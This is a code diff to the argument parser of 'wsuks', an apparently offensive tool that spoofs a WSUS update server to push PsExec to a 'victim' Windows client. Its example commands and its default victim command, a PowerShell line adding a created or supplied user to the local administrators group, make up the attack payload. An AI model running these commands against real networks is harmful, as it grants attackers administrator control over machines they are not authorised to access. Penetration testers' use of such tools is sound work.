@@ -1,6 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 import argparse
 from argparse import RawTextHelpFormatter
 import importlib.metadata
@@ -28,9 +25,9 @@ def printBanner():
 
 def initParser():
     example_text = """Examples:
-    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2
-    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2 -u User -p Password123 -d Domain.local
-    wsuks -t 192.168.0.10 -u User -p Password123 -d Domain.local -dc-ip 192.168.0.1
+    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2                                   # Generates a new user&password and adds it to the local admin group
+    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2 -u User -d Domain.local           # Adds the domain user to the local admin group
+    wsuks -t 192.168.0.10 -u User -p Password123 -d Domain.local -dc-ip 192.168.0.1   # Turns on WSUS server discovery and adds the domain user to the local admin group
     """
     parser = argparse.ArgumentParser(prog='wsuks', epilog=example_text, formatter_class=RawTextHelpFormatter)
 
@@ -40,7 +37,7 @@ def initParser():
     parser.add_argument('-t', '--target-ip', metavar='', dest='targetIp', help='IP Address of the victim Client. (REQUIRED)', required=True)
     parser.add_argument('-I', '--interface', metavar='', help='Network Interface to use. (DEFAULT: %(default)s)', default='eth0')
     parser.add_argument('-e', '--executable', metavar='', default=f'{dirname(wsuks.__file__)}/executables/PsExec64.exe', type=argparse.FileType('rb'), help='The executable to returned to the victim. It has to be signed by Microsoft (DEFAULT: %(default)s)')
-    parser.add_argument('-c', '--command', metavar='', help='The command to execute on the victim. (DEFAULT: %(default)s)', default='/accepteula /s powershell.exe "PREFIXAdd-LocalGroupMember -Group $(Get-LocalGroup -SID S-1-5-32-544 | Select Name) -Member WSUKS_USER"')
+    parser.add_argument('-c', '--command', metavar='', default='/accepteula /s powershell.exe "{CREATE_USER_COMMAND}Add-LocalGroupMember -Group $(Get-LocalGroup -SID S-1-5-32-544 | Select Name) -Member {WSUKS_USER};"', help='The command to execute on the victim. \n(DEFAULT: %(default)s)',)
 
     simple = parser.add_argument_group('AUTOMATIC MODE', 'Discover the WSUS Server automatically by searching for GPOs in SYSVOL. (Default)')
     simple.add_argument('-u', '--username', metavar='', help='Username to authenticate with')
